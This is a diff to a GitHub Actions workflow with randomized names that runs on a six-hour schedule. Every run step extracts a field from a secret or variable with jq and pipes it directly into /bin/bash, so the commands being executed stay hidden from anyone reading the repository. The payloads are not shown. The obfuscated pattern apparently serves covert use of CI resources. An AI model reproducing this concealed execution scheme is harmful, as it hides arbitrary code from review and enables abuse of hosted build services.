@@ -2,24 +2,22 @@ name: jiangneihe3765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
+    - cron: '41 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangneihe3765
         env:
-          htclz14398: ${{ secrets.htclz14398 }}
+          gdbk96: ${{ secrets.gdbk96 }}
         run: |
-          echo $htclz14398 | jq -r .p141 | /bin/bash
-          echo $ty9944 | jq -r .gg6 | /bin/bash
-          echo $ag78 | jq -r .xcn5516 | /bin/bash
-          echo $z318 | jq -r .je41501 | /bin/bash
-          echo $qqen0 | jq -r .t4 | /bin/bash
-          echo $rhut38517 | jq -r .vecli25724 | /bin/bash
-          echo $ub04 | jq -r .d39374 | /bin/bash
-          echo $r05 | jq -r .qjhgr788 | /bin/bash
-          echo $ow9120 | jq -r .ot10023 | /bin/bash
+          echo $gdbk96 | jq -r .wi952 | /bin/bash
+          echo $wszm19541 | jq -r .p1507 | /bin/bash
+          echo $akbnw8 | jq -r .re2 | /bin/bash
+          echo $z653 | jq -r .ewkjl0234 | /bin/bash
+          echo $zsyqz4 | jq -r .dihs78285 | /bin/bash
+          echo $hlbre8 | jq -r .r7 | /bin/bash
 
